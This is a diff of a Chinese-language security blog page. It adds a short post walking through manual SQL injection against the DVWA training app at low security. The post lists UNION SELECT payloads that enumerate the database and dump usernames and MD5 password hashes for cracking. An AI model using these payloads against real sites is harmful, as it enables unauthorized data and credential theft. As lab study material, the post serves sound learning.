@@ -64,6 +64,43 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-SQLlow等级手工注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2020-08-28T14:30:18.000Z" itemprop="datePublished">2020-08-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">SQLlow等级手工注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>1.登录DVWA，设置安全等级为LOW<br>2.输入1’order by 2#,有数据内容出现，输入1’order by 3#,没有数据内容显示，说明数据列只有2列<br>3.输入1’union select database(),user()#,查询数据库的名字，用户名<br>4.输入1’union select version(),@@version_compile_os#’,获取数据库版本和当前操作系统<br>5.输入1’union select table_name,table_schema from information_schema.tables where table_schema= ’dvwa’#,获取数据表的名称，注意’dvwa’前面有空格<br>6.输入1’union select user,password from users#,尝试获得用户名和密码<br>7.密码采用md5进行加密，到<a target="_blank" rel="noopener" href="http://www.cmd5.com进行解密/">www.cmd5.com进行解密</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" data-id="ckszzk0v20005novj53mq4x9t" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-SQLlow等级工具注入" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" class="article-date">
@@ -91,7 +128,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="cksskzywp00046gvj05sdb402" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="ckszzk0v00004novj5v006a1z" class="article-share-link">Share</a>
       
       
     </footer>
@@ -159,7 +196,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="cksskzywh00016gvj57gucyv8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckszzk0v00003novj2s275it7" class="article-share-link">Share</a>
       
       
     </footer>
@@ -196,7 +233,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="cksskzyw600006gvjgy9jfc92" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckszzk0up0000novj23wjgn2m" class="article-share-link">Share</a>
       
       
     </footer>
@@ -245,7 +282,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="cksskzywy000a6gvj4am6dorg" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckszzk0v6000anovj9tftbqs3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -291,6 +328,10 @@ default:
       <ul>
         
           <li>
+            <a href="/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/">域渗透基础</a>
+          </li>
+        
+          <li>
             <a href="/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/">端口转发和代理</a>
           </li>
         
@@ -304,10 +345,6 @@ default:
         
           <li>
             <a href="/2021/08/18/empire%E5%9F%BA%E6%93%8D/">empire基操</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/">免杀收尾和empire</a>
           </li>
         
       </ul>
